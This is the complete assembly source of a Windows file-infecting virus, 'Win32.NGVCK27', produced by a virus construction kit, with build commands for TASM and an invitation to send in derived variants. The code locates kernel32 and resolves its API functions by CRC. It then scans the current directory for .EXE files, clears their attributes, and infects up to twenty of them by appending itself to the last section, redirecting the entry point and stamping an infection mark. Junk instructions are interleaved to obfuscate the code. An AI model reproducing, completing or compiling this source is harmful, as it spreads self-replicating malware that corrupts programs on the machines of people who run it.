              
;
;
; Win32.NGVCK27 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK27
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 2/29/2016
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 26
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m1 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
                                        ; add esp, 4
 dec esp
 add esp, 5d
 mov eax, dword ptr [esp-4]
                                        ; mov ebp, eax
                                        ; clear ebp
 sub ebp, ebp
 add ebp, eax
 sub ebp, offset Delta
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg edx, ebx

 push edx
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea eax, [ebp+WIN32_FIND_DATA]

 push eax
                                        ; clear ebx
 push 0
 pop ebx
 add ebx, dword ptr [ebp+FindHandle]
 push ebx
 call dword ptr [ebp+XFindNextFileA]
ret


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea edi, [ebp+WFD_szFileName]

                                        ; mov edx, 276
 mov edx, 276d

ClearOldData2:
 mov byte ptr [edi], 0h
                                        ; add edi, 1
 sub edi, -1d
 dec edx
 jnz ClearOldData2
 popad
ret





;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear eax
 mov eax, -31830d
 add eax, 31830d
 add eax, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], eax

                                        ; clear ecx
 mov ecx, -31355d
 add ecx, 31355d
 add ecx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], ecx



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ecx,12345678h
 org $-4
 retBase dd 0h
 add ecx,12345678h
 org $-4
 retEIP dd 0h
 jmp ecx



;                  [ ///// * Data * \\\\\ ]

Data:
 TempApisearch2 dd 0h
 NewEIP      dd 0h
 KernelMZ    dd 0h
 TempAPI     dd 0h
 Attributes  dd 0h
 AlignReg2   dd 0h

 APINames:
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h

 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)


 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XCloseHandle           dd 0h
 XFindClose             dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XCreateFileA           dd 0h
 XFindFirstFileA        dd 0h
 XSetFileAttributesA    dd 0h
 XGetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h

 AlignReg1   dd 0h
 FileHandle  dd 0h
 NTableVA    dd 0h
 OTableVA    dd 0h
 KernelPE    dd 0h
 OldBase     dd 400000h
 counter     dw 0h
 OldEIP      dd 0h
 NTableTemp  dd 0h
 db 'Virus : Win32.NGVCK27 Author : SnakeByte',0
 ATableVA    dd 0h
 InfCounter  dd 0h
 MapHandle   dd 0h
 MapAddress  dd 0h
 filemask    db '*.EXE',0
 NewSize     dd 0h
 Trash1      dd 0h
 FindHandle  dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
 rcl eax, 29d                           ; Trash
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop edx
 push edx
                                        ; round to pages
 shr edx, 16d
 shl ebx, 21d                           ; Trash
 ror edx, 16d
                                        ; add edx, 1
 add edx, 1d
GetKernelLoop:
                                        ; clear eax
 and eax, 0
 dec edx
 mov ax, word ptr [edx+03ch]
 test ax,0f800h
 jnz GetKernelLoop
 cmp edx, dword ptr [edx+eax+34h]
 jnz GetKernelLoop
 mov dword ptr [ebp+KernelMZ], 0
 xor dword ptr [ebp+KernelMZ], edx
 mov eax, edx
 add eax, [edx+3Ch]
 mov [KernelPE+ebp], eax
 mov esi, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
                                        ; clear edi
 push 0
 pop edi
 add edi, [esi+78h]
 add edi, [ebp+KernelMZ]
                                        ; add edi, 28
 inc edi
 add edi, 27d
                                        ; get ATableVA
 mov esi, dword ptr [edi]
                                        ; add edi, 4
 add edi, 4d
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], esi
                                        ; get NTableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], esi
                                        ; add edi, 4
 add edi, 4d
                                        ; get OTableVA
 mov esi, dword ptr [edi]
 add esi, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], esi
 jmp GetApis

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 push eax
 div ebx
 sub ebx, edx
 dec ecx                                ; Trash
 pop eax
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 mov ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea esi, [ebp+APINames]

 lea edi, [ebp+APIOffsets]
 xchg edi, ebx


GetApisLoop: 

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset
                                        ; clear the counter
 mov word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add esi, 4
 dec esi
 add esi, 5d
                                        ; clear eax
 push 0
 pop eax
 xor eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], 0
 add dword ptr [ebx], eax
                                        ; add ebx, 4
 add ebx, 4d
 loop GetApisLoop
 lea eax, [ebp+Outbreak]
 xchg edi, eax

 push edi
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov edx, 80000000h or 40000000h
 push edx
 lea edx, [ebp+WFD_szFileName]

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax

CreateMap:                              ; Map the file
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop ecx
 push ecx

                                        ; clear ebx
 xor ebx, ebx
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
 cmp eax, 0
 je CloseFile
                                        ; clear edx
 mov edx, -5233d
 add edx, 5233d
 push ecx
 push edx
 push edx
 push 2h
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 cmp eax, 0
 je UnMapFile
 push eax
 pop dword ptr [ebp+MapAddress]
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
                                        ; get and remove file attributes
 lea edx, [ebp+WFD_szFileName]
 xchg edx, ebx

 push ebx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
                                        ; mov ecx, 128
 mov ecx, 128d
 push ecx
 lea esi, [ebp+WFD_szFileName]
 xchg esi, ebx


 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; clear edi
 xor edi, edi
 xor edi, dword ptr [ebp+MapAddress]
 add ebx, edx                           ; Trash
                                        ; check for ZM
 cmp word ptr [edi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [edi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ebx, dword ptr [edi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, edi
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [ebx], 'EP'
 je Goodfile2
                                        ; clear edx
 and edx, 0
 sub edx, 1
 inc edx
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jnz yNotagoodfile
 jmp Notagoodfile
yNotagoodfile:
 sub dword ptr [ebp+Trash1], 340040     ; Trash
                                        ; check for DLL
 mov ax, word ptr [ebx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
                                        ; check for OBJ
 mov ax, word ptr [ebx+16h]
 and ax, 00002h
 cmp ax, 00002h
 jne Notagoodfile
 call InfectEXE                         ; Infect the file
 jc NoInfection2

Notagoodfile:
 call UnMapFile

NoInfection2:

                                        ; restore the file attributes
                                        ; mov edx, -1
 mov edx, 0
 add edx, -1d
 and edx, dword ptr [ebp+Attributes]
 push edx
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]

NoInfection:
ret




;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
                                        ; clear edi
 push 0
 pop edi
 add edi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov esi, [edi+3Ch]
 add esi, edi
                                        ; get File Alignment
 mov edx, [esi+3Ch]
 and ecx, edx                           ; Trash
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 add eax, VirusSize
 push edx
 xor ecx, 44686111d                     ; Trash
 pop dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], eax
 call Align
 not ebx                                ; Trash
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 mov dword ptr [ebp+NewSize], 0
 xor dword ptr [ebp+NewSize], eax
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 add dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
                                        ; clear esi
 and esi, 0
 add esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, esi
 add edi, dword ptr [esi+3Ch]
                                        ; infect by increasing the last section
 push edi
 pop esi
                                        ; get last section
 movzx edx, word ptr [esi+06h]
 add edx, -1
 imul edx, edx, 28h
                                        ; add edi, 120
 add edi, 120d
 add edi, edx
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add edi, eax
                                        ; get old Entrypoint
 mov eax, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], eax
 mov ecx, dword ptr [esi+34h]
 push ecx
 pop dword ptr [ebp+OldBase]
                                        ; clear ecx
 and ecx, 0

 add ecx, [edi+10h]
                                        ; mov eax, ecx
                                        ; clear eax
 mov eax, 26984d
 sub eax, 26984d
 add eax, ecx
 add ecx, [edi+14h]
 push ecx
 mov edx, eax
 add edx, [edi+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], edx
                                        ; save new enty point in file
 mov dword ptr [esi+28h], edx
 mov edx, [edi+10h]
 push edx
                                        ; calculate new section size
 add edx, VirusSize
 mov dword ptr [ebp+AlignReg1], -1
 and dword ptr [ebp+AlignReg1], edx
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], 0h
 and dword ptr [ebp+Trash1], 1171462    ; Trash
 add dword ptr [edi+10h], edx
 pop edx
 add edx,  (VirusSize-1936d)
 add edx, 1936d
 mov dword ptr [edi+08h], 0
 add dword ptr [edi+08h], edx
 mov edx, dword ptr [edi+10h]
 add edx, dword ptr [edi+0Ch]
 mov dword ptr [esi+50h], edx
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 lea ecx, [ebp+Virus]
 xchg esi, ecx

 mov eax, VirusSize
 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
                                        ; mov edx, -1
 mov edx, -1d
 and edx, dword ptr [ebp+InfCounter]
 add dword ptr [ebp+Trash1], ebx        ; Trash
 sub edx, 1
 mov dword ptr [ebp+InfCounter], 0
 xor dword ptr [ebp+InfCounter], edx
 clc
ret

NoEXE:
 stc
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 push dword ptr [ebp+NTableVA]
 pop edx


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], -1
 and dword ptr [ebp+NTableTemp], edx
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
                                        ; mov edx, ecx
 mov edx, ecx
                                        ; mov edi, edx
                                        ; clear edi
 mov edi, 0
 add edi, edx
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], edi
 push esi
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
 mov eax, dword ptr [esi]
 LoopChsksm:
                                        ; clear ecx
 mov ecx, -43072d
 add ecx, 43072d
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 sub edi, -1d
 shl cx,8d
 sub eax, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 xor ecx, ecx
 mov cl, byte ptr [edi]
 sub eax, ecx
                                        ; add edi, 1
 sub edi, -1d
 xor dword ptr [ebp+Trash1], ebx        ; Trash
 test cx, cx
 jnz LoopChsksm
LoopConti:
 cmp eax, 0
 je FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop esi
 push dword ptr [ebp+TempApisearch2]
 pop edi
                                        ; clear edx
 push 0
 pop edx
 xor edx, dword ptr [ebp+NTableTemp]
 sub eax, 4306038d                      ; Trash
                                        ; add edx, 4
 add edx, 4d
 inc word ptr [ebp+counter]
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1
 adc ebx, 83814576d                     ; Trash

FoundApi1:                              ; we found the API
                                        ; clear Stack
 add esp, 4d
 neg edx                                ; Trash
                                        ; retrieve the offset
                                        ; clear ebx
 sub ebx, ebx
 mov bx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 push ebx
 pop eax
 movzx ebx, word ptr [eax]
 sal ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov eax, dword ptr [ebx]
 add eax, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], eax
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...
                                        ; store old EIP and ImageBase
                                        ; clear ebx
 push 0
 pop ebx
 xor ebx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], ebx

 push dword ptr [ebp+OldEIP]
 pop ecx
 adc dword ptr [ebp+Trash1], ebx        ; Trash

 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ecx




;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov ecx, offset filemask
 add ecx, ebp

                                        ; Set Infection Counter
 push 20d
 pop dword ptr [ebp+InfCounter]
                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
                                        ; clear ebx
 xor ebx, ebx
 xor ebx, dword ptr [ebp+InfCounter]
 test ebx, ebx
 jz EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 or eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

